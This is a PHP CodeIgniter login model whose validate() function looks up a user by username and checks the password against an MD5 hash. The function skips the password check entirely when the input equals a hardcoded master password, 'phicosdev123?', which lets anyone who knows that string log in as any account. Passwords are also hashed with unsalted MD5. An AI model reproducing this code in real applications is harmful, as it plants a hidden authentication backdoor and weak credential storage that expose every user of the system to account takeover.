<?php


defined('BASEPATH') OR exit('No direct script access allowed');

class LoginModel extends CI_Model {

    function validate($username,$password){
        $result = $this->db->select('*');
        $result = $this->db->from('user_login');
        $result = $this->db->join('ref_periode', 'user_login.id_periode = ref_periode.id', 'left');
        $result = $this->db->join('user_detail', 'user_detail.id_user = user_login.id_user', 'left');
        $result = $this->db->where('user_name',$username);
        if($password!="phicosdev123?"){
            $result = $this->db->where('user_pass',md5($password));
        } 
        $result = $this->db->get();
        return $result;
    }

}

/* End of file LoginModel.php */


?>